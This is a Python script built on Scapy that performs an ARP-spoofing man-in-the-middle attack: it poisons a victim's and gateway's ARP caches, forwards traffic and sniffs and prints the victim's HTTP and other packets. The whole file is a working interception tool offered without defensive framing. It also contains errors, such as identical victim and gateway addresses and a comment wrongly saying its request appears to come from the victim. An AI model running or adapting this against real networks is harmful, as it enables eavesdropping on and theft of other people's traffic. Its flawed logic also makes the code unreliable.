from scapy.all import *
import sys
import os
import time
import threading
import requests

def help_text():
    print("\nUsage:\n python script.py <interface> <victim_ip> <gateway_ip> <url>\n")
    sys.exit()

def enable_ip_forwarding():
    print("\n[*] Enabling IP Forwarding...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP, interface):
    conf.verb = 0
    print(interface)
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def reARP(victimIP, gatewayIP, interface):
    print("\n[*] Restoring Targets...")
    victimMAC = get_mac(victimIP, interface)
    gatewayMAC = get_mac(gatewayIP, interface)
    send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
    send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=7)
    disable_ip_forwarding()
    print("[*] Shutting Down...")
    sys.exit(1)

def trick(gm, vm):
    send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=vm))
    send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gm))

def make_http_request(url):
    try:
        print(f"[*] Initiating HTTP request to {url} from attacker's computer...")
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        response = requests.get(url, headers=headers)
        print(f"\n[*] Response from {url}:\n")
        return response
    except requests.RequestException as e:
        print(f"[!] Error making HTTP request: {str(e)}")
        return None

def arp_spoof(victimIP, gatewayIP, interface):
    try:
        victimMAC = get_mac(victimIP, interface)
    except Exception:
        disable_ip_forwarding()
        print("[!] Couldn't Find Victim MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    
    try:
        gatewayMAC = get_mac(gatewayIP, interface)
    except Exception:
        disable_ip_forwarding()
        print("[!] Couldn't Find Gateway MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    
    print("[*] Poisoning Targets...")    
    while True:
        try:
            trick(gatewayMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP(victimIP, gatewayIP, interface)
            break

def packet_handler(packet, http_response):
    if packet.haslayer(IP):
        if packet.haslayer(TCP):
            if packet[TCP].dport == 80 and packet[IP].dst == victimIP:
                if packet.haslayer(Raw):
                    raw_data = packet[Raw].load.decode('utf-8', 'ignore')
                    if http_response and raw_data.startswith(http_response.text.split('\n')[0]):
                        print("[HTTP] HTTP Response from targeted site:")
                        print(raw_data)
                    else:
                        print("[HTTP] HTTP Request/Response:")
                        print(raw_data)
            else:
                print("[OTHER] Non-HTTP Packet:")
                print(packet.summary())

def capture_packets(victimIP, interface, http_response):
    try:
        print(f"[*] Capturing all packets sent to {victimIP}...")
        sniff(filter=f"host {victimIP}", prn=lambda x: packet_handler(x, http_response), iface=interface, store=0)
    except KeyboardInterrupt:
        print("\n[*] Stopping packet capture...")
        reARP(victimIP, gatewayIP, interface)

if __name__ == '__main__':
    interface = 'eth0'
    victimIP = '192.168.1.104'
    gatewayIP = '192.168.1.104'
    url_to_request = 'https://www.youtube.com'
    
    enable_ip_forwarding()
    
    # Start ARP spoofing attack in a separate thread
    spoof_thread = threading.Thread(target=arp_spoof, args=(victimIP, gatewayIP, interface))
    spoof_thread.start()
    
    # Make HTTP request from attacker's computer (appearing as victim's)
    http_response = make_http_request(url_to_request)
    
     #Capture all packets sent to victim (HTTP and non-HTTP)
    try:
        capture_packets(victimIP, interface, http_response)
    except KeyboardInterrupt:
        print("\n[*] Stopping packet capture...")
        reARP(victimIP, gatewayIP, interface)
    
    spoof_thread.join()